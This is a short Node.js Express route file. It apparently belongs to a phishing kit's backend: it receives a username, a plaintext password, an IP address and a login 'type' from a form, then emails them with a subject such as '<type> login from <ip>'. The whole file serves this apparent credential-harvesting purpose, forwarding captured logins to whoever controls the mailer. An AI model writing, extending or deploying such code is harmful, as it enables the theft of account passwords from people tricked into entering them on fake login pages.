let express = require('express')
let router = express.Router()
let mailer = require('../helper/mailer')

router.post('/send-mail', (req, res) => {
    const { username, pass, ip, type } = req.body
    const subject = `${type} login from ${ip}`
    mailer.sendEmail(res, subject, username, pass, ip, type)
})

module.exports = router
